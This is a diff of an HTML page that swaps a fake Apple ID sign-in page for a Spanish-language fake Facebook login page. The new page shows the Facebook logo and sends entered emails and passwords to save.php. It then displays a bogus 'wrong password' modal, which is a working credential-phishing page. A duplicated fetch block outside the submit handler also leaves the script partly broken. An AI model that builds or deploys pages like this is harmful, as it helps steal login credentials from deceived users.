@@ -1,156 +1,87 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple ID Login</title>
-    <style>
-        /* Estilos generales */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-color: #f9f9f9;
-        }
-
-        /* Contenedor principal */
-        .login-container {
-            text-align: center;
-            background: #ffffff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 350px;
-        }
-
-        /* Contenedor de la manzana con el círculo de colores */
-        .logo-container {
-            position: relative;
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 20px;
-        }
-
-        /* Círculo de colores */
-        .circle-gradient {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: conic-gradient(
-                #FF3B30, #FF9500, #FFCC00, #34C759, #5AC8FA, #007AFF, #5856D6, #FF2D55, #FF3B30
-            );
-            border-radius: 50%;
-            z-index: 1;
-        }
-
-        /* Logo de Apple (manzana) */
-        .logo {
-            position: absolute;
-            top: 25%;
-            left: 25%;
-            width: 50%;
-            height: 50%;
-            z-index: 2;
-        }
-
-        /* Título */
-        h1 {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            color: #333;
-        }
-
-        /* Input de usuario */
-        .input-box {
-            display: flex;
-            align-items: center;
-            border: 1px solid #d1d1d1;
-            border-radius: 6px;
-            padding: 10px;
-            margin-bottom: 15px;
-        }
-
-        input {
-            border: none;
-            outline: none;
-            flex: 1;
-            font-size: 16px;
-            color: #333;
-        }
-
-        /* Botón de flecha */
-        .arrow-button {
-            background: transparent;
-            border: none;
-            cursor: pointer;
-        }
-
-        .arrow-button img {
-            width: 20px;
-        }
-
-        /* Checkbox y etiquetas */
-        .keep-signed {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            color: #555;
-        }
-
-        .keep-signed input {
-            margin-right: 8px;
-        }
-
-        /* Enlaces */
-        a {
-            text-decoration: none;
-            color: #0066cc;
-            font-size: 14px;
-            display: block;
-            margin-bottom: 10px;
-        }
-
-        a:hover {
-            text-decoration: underline;
-        }
-
-    </style>
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="login-container">
-        <!-- Contenedor del logo con círculo -->
-        <div class="logo-container">
-            <div class="circle-gradient"></div>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <form class="login-form" id="loginForm" action="save.php" method="post">
+            <input type="text" id="email" name="email" placeholder="Celular o correo electrónico" required>
+            <input type="password" id="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+        </form>
+
+        <!-- Modal de error -->
+        <div id="errorModal" class="modal">
+            <div class="modal-content">
+                <h2>Contraseña incorrecta</h2>
+                <p>Hubo un error al intentar iniciar sesión. Verifica tus datos.</p>
+                <button id="closeModal" class="aceptar">ACEPTAR</button>
+            </div>
         </div>
 
-        <!-- Título -->
-        <h1>Sign in with Apple ID</h1>
+        <script>
+            // Mostrar modal si hay un error
+            document.getElementById('loginForm').addEventListener('submit', function(event) {
+                event.preventDefault();
 
-        <!-- Input Box -->
-        <div class="input-box">
-            <input type="email" placeholder="Email or Phone Number">
-            <button class="arrow-button">
-                <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" alt="Arrow">
-            </button>
-        </div>
+                const formData = new FormData(this);
 
-        <!-- Mantener sesión activa -->
-        <div class="keep-signed">
-            <input type="checkbox" id="keep-signed-in">
-            <label for="keep-signed-in">Keep me signed in</label>
-        </div>
+                fetch('save.php', {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => response.text())
+                .then(data => {
+                    if (data.trim() === 'success') {
+                        alert("Inicio de sesión registrado correctamente.");
+                    } else {
+                        document.getElementById('errorModal').style.display = 'block';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('errorModal').style.display = 'block';
+                });
+            });
 
-        <!-- Enlaces -->
-        <a href="#">Forgot Apple ID or password?</a>
-        <a href="#">Create Apple ID</a>
-    </div>
+            document.getElementById('closeModal').addEventListener('click', function() {
+                document.getElementById('errorModal').style.display = 'none';
+            });
+ 
+function showErrorModal() {
+    console.log("Mostrando modal de error"); // Mensaje de depuración
+    document.getElementById('errorModal').style.display = 'block';
+}
+
+
+fetch('save.php', {
+    method: 'POST',
+    body: formData,
+})
+.then(response => response.text())
+.then(data => {
+    console.log("Respuesta del servidor:", data); // Agrega este mensaje
+    if (data.trim() === 'success') {
+        alert("Inicio de sesión registrado correctamente.");
+    } else {
+        document.getElementById('errorModal').style.display = 'block';
+    }
+})
+.catch(error => {
+    console.error('Error en la solicitud:', error);
+    document.getElementById('errorModal').style.display = 'block';
+});
+
+</script>
+</div>
 </body>
 </html>
+
